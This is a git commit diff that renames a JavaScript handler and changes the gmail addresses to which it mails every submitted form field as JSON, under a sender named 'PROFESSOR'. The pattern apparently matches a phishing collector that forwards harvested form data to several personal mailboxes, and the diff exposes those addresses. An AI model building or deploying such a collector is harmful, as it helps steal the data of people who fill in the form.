2c0353bf6af1accb0d28d273222c466a3da68737
tufailacjsm37-design <tufailacjsm37@gmail.com>
2026-02-20 21:42:55 +0500

    Update and rename Rahal.js to tufaill.js

--- tufaill.js
+++ tufaill.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,rehannizamani303@gmail.com",
-      subject: "Rahal",
+      to: "ta0134750@gmail.com,alizajack00@gmail.com",
+      subject: "tufaill",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Asif Link</h3><pre>${JSON.stringify(
         formData,
